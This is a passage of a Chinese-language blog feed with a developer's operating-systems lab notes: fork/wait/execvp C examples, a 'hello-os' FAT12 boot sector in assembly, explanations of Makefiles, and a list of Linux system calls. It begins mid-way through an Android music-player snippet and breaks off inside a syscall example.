播放音乐</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        button_stop.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="comment">// 判断是否在播放音乐</span></span><br><span class="line">                <span class="keyword">if</span> (mediaPlayer.isPlaying())</span><br><span class="line">                    mediaPlayer.pause(); <span class="comment">// 暂停音乐</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Android移动开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android移动开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统进程管理实验</title>
      <link href="/2024/11/12/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E5%AE%9E%E9%AA%8C/"/>
      <url>/2024/11/12/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h4 id="父子进程"><a href="#父子进程" class="headerlink" title="父子进程"></a>父子进程</h4><p><strong>用系统调用fork()函数实现子进程的创建，熟悉进程创建的执行过程。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 打印主进程的 PID</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello, world (pid: %d)\n&quot;</span>, (<span class="type">int</span>)getpid());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建子进程</span></span><br><span class="line">    <span class="type">int</span> rc = fork();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误处理：如果 fork() 失败</span></span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 子进程执行的部分</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am the child (pid: %d)\n&quot;</span>, (<span class="type">int</span>)getpid());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 父进程执行的部分</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am the parent of %d (pid: %d)\n&quot;</span>, rc, (<span class="type">int</span>)getpid());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong><strong>wait</strong>   等待可以等待子进程完毕，避免子进程结束后资源无法收回成为僵尸进程。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 打印主进程的 PID</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello, world (pid: %d)\n&quot;</span>, (<span class="type">int</span>)getpid());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建子进程</span></span><br><span class="line">    <span class="type">int</span> rc = fork();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误处理：如果 fork() 失败</span></span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 子进程执行的部分</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am the child (pid: %d)\n&quot;</span>, (<span class="type">int</span>)getpid());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 父进程执行的部分</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> status;</span><br><span class="line">        wait(&amp;status);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am the parent of %d (pid: %d)\n&quot;</span>, rc, (<span class="type">int</span>)getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>到现在可以明确一个道理，else 只是为了区分子进程和父进程谁先执行，但是子进程和父进程的代码块就是他们一定会执行的一些逻辑操作。你可以在不同代码块加上exit或者return 。把他当作一个程序去写。<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241112143931.png" alt="image.png"></p><p><strong>编写一个程序，在调用fork()之前，让主进程访问一个变量（例如x），并将其值设置为某个值（例如100）。请问子进程中的变量是什么值？当子进程和父进程都改变x的值时，该变量会发生什么？</strong></p><p>具体来说，<code>fork()</code> 会创建一个子进程，但在最开始，父进程和子进程的内存内容是相同的，并不是完全独立的。它们共享同一块内存区域，直到其中一个进程修改了某个变量（比如 <code>x</code>），操作系统才会为修改该变量的进程分配一块新的内存副本。</p><p><strong>关键点：</strong></p><ul><li><strong>初始共享</strong>：<code>fork()</code> 后，父子进程在内存中是共享的，直到其中一个进程进行写操作。父子进程并不会立刻各自拥有独立的内存副本。</li><li><strong>写时复制（COW）</strong>：当父进程或子进程修改某个共享的内存区域时，操作系统会为该进程创建一个独立的副本（这就是写时复制），确保两个进程不互相影响。</li></ul><p><strong>举个例子：</strong></p><ul><li>假设在 <code>fork()</code> 之后，父进程和子进程都访问变量 <code>x</code>，初始时它们的 <code>x</code> 值相同。</li><li>只有当父进程或子进程修改 <code>x</code> 时，操作系统才会为修改 <code>x</code> 的进程分配新的内存副本。</li></ul><p>所以，尽管在 <code>fork()</code> 之后父子进程的内存空间是独立的，实际操作中，它们初始时通过写时复制共享了内存，直到其中一个进程做出修改。</p><p><em><strong>wait 前面的逻辑</strong></em><br>如果在父进程调用 <code>wait()</code> 函数之前还有其他的逻辑，父进程会执行这些逻辑，并 <strong>不会立即</strong> 等待子进程。</p><p><code>wait()</code> 函数的作用是使父进程等待其子进程的结束，直到子进程退出并收集到它的退出状态。如果在调用 <code>wait()</code> 之前执行了其他操作，父进程在这些操作完成后才会进入等待状态。所以，如果在 <code>wait()</code> 之前有逻辑执行，那么父进程会先执行这些逻辑，直到程序执行到 <code>wait()</code>，才会开始等待子进程的结束。我好像突然懂了。一般来讲子进程和父进程并发执行，但是如果说子进程先执行，其实父进程wait函数就没作用，但是父进程先执行，执行到wait会自动等待</p><p><strong>执行命令</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>    <span class="comment">// open() 等相关头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>   <span class="comment">// read(), write() 等相关头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>   <span class="comment">// strlen() 用于获取字符串长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 打印主进程的 PID</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello, world (pid: %d)\n&quot;</span>, (<span class="type">int</span>)getpid());</span><br><span class="line">    <span class="comment">// 创建子进程</span></span><br><span class="line">    <span class="type">int</span> rc = fork();</span><br><span class="line">    <span class="comment">// 错误处理：如果 fork() 失败</span></span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 子进程执行的部分</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> *args[] = &#123; <span class="string">&quot;ps&quot;</span>, <span class="string">&quot;aux&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">        execvp(args[<span class="number">0</span>], args);  <span class="comment">// execvp 用于执行外部命令</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am the child (pid: %d)\n&quot;</span>, (<span class="type">int</span>)getpid());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 父进程执行的部分</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> status;</span><br><span class="line">        wait(&amp;status);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am the parent of %d (pid: %d)\n&quot;</span>, rc, (<span class="type">int</span>)getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,status);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统启动实验</title>
      <link href="/2024/11/12/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E5%AE%9E%E9%AA%8C/"/>
      <url>/2024/11/12/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h4 id="简单的操作系统"><a href="#简单的操作系统" class="headerlink" title="简单的操作系统"></a>简单的操作系统</h4><h5 id="汇编代码"><a href="#汇编代码" class="headerlink" title="汇编代码"></a>汇编代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">; hello-os</span><br><span class="line">; TAB=4</span><br><span class="line"></span><br><span class="line">ORG0x7c00; 指明程序装载地址</span><br><span class="line"></span><br><span class="line">; 标准FAT12格式软盘专用的代码 Stand FAT12 format floppy code</span><br><span class="line"></span><br><span class="line">JMPentry</span><br><span class="line">DB0x90</span><br><span class="line">DB&quot;HELLOIPL&quot;; 启动扇区名称（8字节）</span><br><span class="line">DW512; 每个扇区（sector）大小（必须512字节）</span><br><span class="line">DB1; 簇（cluster）大小（必须为1个扇区）</span><br><span class="line">DW1; FAT起始位置（一般为第一个扇区）</span><br><span class="line">DB2; FAT个数（必须为2）</span><br><span class="line">DW224; 根目录大小（一般为224项）</span><br><span class="line">DW2880; 该磁盘大小（必须为2880扇区1440*1024/512）</span><br><span class="line">DB0xf0; 磁盘类型（必须为0xf0）</span><br><span class="line">DW9; FAT的长度（必??9扇区）</span><br><span class="line">DW18; 一个磁道（track）有几个扇区（必须为18）</span><br><span class="line">DW2; 磁头数（必??2）</span><br><span class="line">DD0; 不使用分区，必须是0</span><br><span class="line">DD2880; 重写一次磁盘大小</span><br><span class="line">DB0,0,0x29; 意义不明（固定）</span><br><span class="line">DD0xffffffff; （可能是）卷标号码</span><br><span class="line">DB&quot;HELLO-OS   &quot;; 磁盘的名称（必须为11字?，不足填空格）</span><br><span class="line">DB&quot;FAT12   &quot;; 磁盘格式名称（必??8字?，不足填空格）</span><br><span class="line">RESB18; 先空出18字节</span><br><span class="line"></span><br><span class="line">; 程序主体</span><br><span class="line"></span><br><span class="line">entry:</span><br><span class="line">MOVAX,0; 初始化寄存器</span><br><span class="line">MOVSS,AX</span><br><span class="line">MOVSP,0x7c00</span><br><span class="line">MOVDS,AX</span><br><span class="line">MOVES,AX</span><br><span class="line"></span><br><span class="line">MOVSI,msg</span><br><span class="line">putloop:</span><br><span class="line">MOVAL,[SI]</span><br><span class="line">ADDSI,1; 给SI加1</span><br><span class="line">CMPAL,0</span><br><span class="line">JEfin</span><br><span class="line">MOVAH,0x0e; 显示一个文字</span><br><span class="line">MOVBX,15; 指定字符颜色</span><br><span class="line">INT0x10; 调用显卡BIOS</span><br><span class="line">JMPputloop</span><br><span class="line">fin:</span><br><span class="line">HLT; 让CPU停止，等待指令</span><br><span class="line">JMPfin; 无限循环</span><br><span class="line"></span><br><span class="line">msg:</span><br><span class="line">DB0x0a, 0x0a; 换行两次</span><br><span class="line">DB&quot;hello, world&quot;</span><br><span class="line">DB0x0a; 换行</span><br><span class="line">DB      &quot;hello MYOS,K1T000&quot;</span><br><span class="line">DB0x0a; 换行</span><br><span class="line">DB0</span><br><span class="line"></span><br><span class="line">RESB0x7dfe-$; 填写0x00直到0x001fe</span><br><span class="line"></span><br><span class="line">DB0x55, 0xaa</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用工具构建<br><strong>makefile</strong></p><p>1. <strong>Makefile 的功能</strong></p><p><code>Makefile</code> 是一种用于自动化构建过程的脚本文件，通常与 <code>make</code> 工具一起使用。在开发中，它定义了如何编译和链接代码，如何生成目标文件，如何处理依赖关系等。通过 <code>make</code> 命令，开发人员可以根据 <code>Makefile</code> 中的指令自动执行任务，比如编译源代码、创建可执行文件、生成镜像文件等。</p><p>具体来说，<code>Makefile</code> 包含：</p><ul><li>目标（target）：如 <code>helloos.img</code>、<code>helloos.bin</code> 等生成的文件。</li><li>规则（rule）：定义如何生成目标文件的步骤。</li><li>依赖关系（dependency）：指定哪些文件或目标是当前目标的依赖。</li><li>命令（command）：用于生成目标文件的具体操作。</li></ul><h5 id="采用汇编"><a href="#采用汇编" class="headerlink" title="采用汇编"></a>采用汇编</h5><p> 1. <strong>为什么用汇编语言写操作系统？</strong></p><p>写操作系统时，选择使用汇编语言通常有以下几个原因：</p><p> <strong>(1) 操作系统对硬件的直接控制</strong></p><p>操作系统，尤其是引导程序、内核的早期部分，需要直接控制硬件资源（如 CPU、内存、硬盘等）。汇编语言提供了极低级别的控制，使你能够精确地操作硬件，比如设置中断向量、控制内存映射等。</p><p>在操作系统启动的早期阶段（引导加载程序），需要与硬件打交道，这时 C 语言的抽象就不再合适，汇编提供的直接访问硬件的能力是必要的。</p><p><strong>(2) 性能和效率</strong></p><p>汇编语言是一种低级语言，通常比高级语言（如 C 语言）更高效。对于内核的某些关键部分，使用汇编可以实现非常高效的操作，如上下文切换、任务调度等。</p><p> <strong>(3) 学习和理解底层原理</strong></p><p>通过汇编语言写操作系统的早期部分，你可以深入了解计算机的底层架构，包括 CPU 寄存器、栈操作、中断机制等。这对理解操作系统的工作原理非常有帮助。</p><p> 2. <strong>为什么不直接用 C 语言写操作系统？</strong></p><p>虽然 C 语言在编写操作系统时非常流行，但它并不是完全适合于操作系统所有部分的语言。操作系统的早期阶段（如引导加载程序）确实需要使用汇编语言。以下是一些原因，解释为什么 C 语言通常不会在操作系统的整个开发过程中取代汇编语言：</p><p> <strong>(1) 操作系统的启动过程</strong></p><p>在操作系统启动的初期阶段，CPU 和硬件设备的控制非常直接。你必须配置中断、设置段寄存器、初始化内存等，这些操作 C 语言通常做不到。C 语言对硬件的抽象非常强，它需要操作系统提供的运行时环境来支持，而在操作系统的引导加载过程中（也就是 <code>bootloader</code> 阶段），这些环境尚未建立。</p><p> <strong>(2) C 语言依赖于运行时库</strong></p><p>C 语言虽然非常接近硬件，但它依赖于操作系统的运行时库（例如标准库、系统调用等），这些库在操作系统本身没有完成之前无法使用。操作系统内核的开发必须考虑到这些库在编译时没有定义的情况，因此，直接使用 C 语言的执行环境并不适合操作系统的最初开发。</p><p> <strong>(3) 操作系统设计中的低级任务</strong></p><p>有些操作系统的设计任务需要处理直接与硬件相关的低级任务。例如，操作系统的中断处理、设备驱动、任务调度等，需要非常精确的控制和高效的代码。这些任务用汇编语言编写时更为简单和高效，而在 C 语言中，编译器的优化有时会使代码变得不够高效，特别是与硬件交互时。</p><p> <strong>(4) 更好的移植性和可维护性</strong></p><p>尽管操作系统开发时可能会用汇编语言，但现代操作系统的核心部分通常还是会用 C 语言开发。因为 C 语言具备较好的移植性、可维护性和易读性，尤其是相对于汇编语言。汇编语言的代码是与硬件架构紧密耦合的，因此难以移植，而 C 语言能够在不同的硬件平台上进行相对容易的移植。</p><h5 id="关于-Make-的使用"><a href="#关于-Make-的使用" class="headerlink" title="关于 Make 的使用"></a><strong>关于 <code>Make</code> 的使用</strong></h5><p><code>Make</code> 是一个自动化工具，主要用于自动化编译和构建过程。它可以让你通过一个 <code>Makefile</code> 文件定义如何从源代码生成目标文件（如 <code>.o</code> 文件、可执行文件等）。让我们来看一下如何使用 <code>Make</code> 来编译一个汇编语言编写的操作系统。</p><h5 id="基本的-Makefile-结构"><a href="#基本的-Makefile-结构" class="headerlink" title="基本的 Makefile 结构"></a><strong>基本的 <code>Makefile</code> 结构</strong></h5><p>一个简单的 <code>Makefile</code> 包含以下几个基本部分：</p><ul><li><strong>目标（target）</strong>：你希望生成的文件，比如 <code>.o</code> 文件、最终的可执行文件。</li><li><strong>依赖（dependency）</strong>：生成目标所需要的源文件。</li><li><strong>规则（rule）</strong>：从依赖生成目标的命令。</li></ul><p>假设你有一个简单的操作系统源码，包含以下文件：</p><ul><li><code>boot.asm</code>：引导程序（使用汇编语言编写）</li><li><code>kernel.asm</code>：操作系统内核（使用汇编语言编写）</li><li><code>link.ld</code>：链接脚本，用于将生成的目标文件链接成最终的可执行镜像</li></ul><p><strong><code>make</code></strong> 工具不仅仅用于编译操作系统项目，它实际上是一个非常通用的自动化构建工具，广泛应用于各种编程项目中，无论是 C 语言、C++、汇编语言，还是其他语言的项目。它的核心功能是通过 <code>Makefile</code> 自动化地管理源代码的编译、链接等过程，使得项目的构建变得更加高效和可重复。</p><h5 id="make-的应用场景"><a href="#make-的应用场景" class="headerlink" title="make 的应用场景"></a><strong><code>make</code> 的应用场景</strong></h5><p><code>make</code> 工具可以用于编译许多类型的项目，常见的包括：</p><ul><li><strong>C&#x2F;C++ 项目</strong>：这是 <code>make</code> 最常见的应用场景，尤其是在大型项目中，可以帮助管理多个源文件的编译与链接。</li><li><strong>Python 项目</strong>：虽然 Python 本身不需要编译，但 <code>make</code> 可以用于自动化测试、打包、清理等任务。</li><li><strong>Java 项目</strong>：尽管 Maven 或 Gradle 是更常用的构建工具，但 <code>make</code> 也可以用于编译 Java 源文件。</li><li><strong>汇编语言项目</strong>：正如你在操作系统开发中看到的，<code>make</code> 也可以用来自动化汇编语言文件的编译过程。</li><li><strong>其他脚本语言</strong>：对于 Bash 脚本、Ruby 脚本等，<code>make</code> 可以用来执行特定任务，如运行测试、部署应用等。</li></ul><h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><p>make file 或者直接 nask.exe  helloos.nas  helloos.img  </p><p>2、虚拟机启动操作系统</p><p>Step1：启动VMware，创建一个新的虚拟机MyOS（注意加上软盘驱动器）；</p><p>Step2：设置从软盘镜像文章中启动系统，文件为刚做好的helloos.img</p><p><img src="/"> <img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241105145924.png" alt="image.png"><br>Step3：启动该虚拟机<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241105145942.png" alt="image.png"></p><h4 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h4><p>Linux系统中，用户程序可以通过隐式调用或显示调用使用系统调用。</p><p>隐式调用——用户通过封装了系统调用的API使用系统调用</p><p>显式调用——使用syscall()函数实现调用，int syscall(int number,…)，number是系统调用号</p><h5 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h5><p><code>syscall</code> 并不仅仅用于获取进程 ID（PID），它是用于直接与操作系统内核交互的一种方式，允许你调用任何支持的系统调用。<code>syscall</code> 函数是一个低级接口，通过它你可以直接发起操作系统的系统调用。</p><h3 id="syscall-的基本用法"><a href="#syscall-的基本用法" class="headerlink" title="syscall 的基本用法"></a><code>syscall</code> 的基本用法</h3><p><code>syscall</code> 函数是一个系统调用接口，允许你通过系统调用号来调用操作系统内核提供的底层功能。它的基本签名通常如下：</p><p>c</p><p><code>long syscall(long number, ...);</code></p><ul><li><code>number</code> 是系统调用的编号，也就是操作系统为每个系统调用分配的一个唯一的数字（如 <code>SYS_getpid</code>、<code>SYS_read</code> 等）。</li><li>后面的 <code>...</code> 是系统调用的参数，具体取决于你要调用的系统调用。</li></ul><h5 id="syscall-支持的系统调用"><a href="#syscall-支持的系统调用" class="headerlink" title="syscall 支持的系统调用"></a><code>syscall</code> 支持的系统调用</h5><p><code>syscall</code> 函数是通用的，可以用来调用几乎所有的系统调用，不仅仅是 <code>getpid</code>。以下是一些常见的可以通过 <code>syscall</code> 调用的操作系统系统调用：</p><ol><li><p><strong>进程管理相关的系统调用</strong>：</p><ul><li><code>SYS_getpid</code>：获取当前进程的 PID（进程 ID）。</li><li><code>SYS_fork</code>：创建一个新的进程（子进程）。</li><li><code>SYS_exit</code>：使当前进程退出。</li><li><code>SYS_getppid</code>：获取父进程的 PID。</li><li><code>SYS_waitpid</code>：等待子进程的状态改变。</li></ul></li><li><p><strong>文件操作相关的系统调用</strong>：</p><ul><li><code>SYS_open</code>：打开文件。</li><li><code>SYS_read</code>：从文件描述符中读取数据。</li><li><code>SYS_write</code>：向文件描述符写入数据。</li><li><code>SYS_close</code>：关闭文件描述符。</li><li><code>SYS_lseek</code>：设置文件指针的位置。</li></ul></li><li><p><strong>内存管理相关的系统调用</strong>：</p><ul><li><code>SYS_brk</code>：改变数据段的结束地址。</li><li><code>SYS_mmap</code>：内存映射文件或设备到进程的虚拟内存。</li><li><code>SYS_munmap</code>：解除内存映射。</li></ul></li><li><p><strong>信号和中断相关的系统调用</strong>：</p><ul><li><code>SYS_kill</code>：发送信号给进程。</li><li><code>SYS_signal</code>：设置信号处理程序。</li></ul></li><li><p><strong>网络操作相关的系统调用</strong>：</p><ul><li><code>SYS_socket</code>：创建一个新的网络套接字。</li><li><code>SYS_connect</code>：连接到远程主机。</li><li><code>SYS_sendto</code>：向指定的地址发送数据。</li><li><code>SYS_recvfrom</code>：从指定的地址接收数据。</li></ul></li><li><p><strong>时间和日期相关的系统调用</strong>：</p><ul><li><code>SYS_time</code>：获取系统的当前时间。</li><li><code>SYS_gettimeofday</code>：获取当前时间戳。</li></ul></li></ol><p>隐式调用实际上是指别人已经为你封装好了底层的功能，你不需要手动调用底层的系统调用（如 <code>syscall</code>），而是通过更高级的接口来实现相同的功能。这种封装不仅让你在编程时更加方便，也提高了代码的可读性和可维护性。</p><h5 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h5><p><code>libc</code>（C 语言标准库，<code>lib</code> 是 “library” 的缩写）是一个包含 C 语言标准函数的库。它为开发者提供了许多标准功能，诸如输入输出（I&#x2F;O）、内存管理、字符串操作、数学函数等。在类Unix 操作系统中，<code>libc</code> 通常是一个包含系统调用封装的共享库。</p><h5 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(viod)</span> &#123;</span><br><span class="line"><span class="type">long</span> ID1, ID2;</span><br><span class="line">ID1=syscall(SYS_getpid);     <span class="comment">/*显式系统调用*/</span></span><br><span class="line"><span 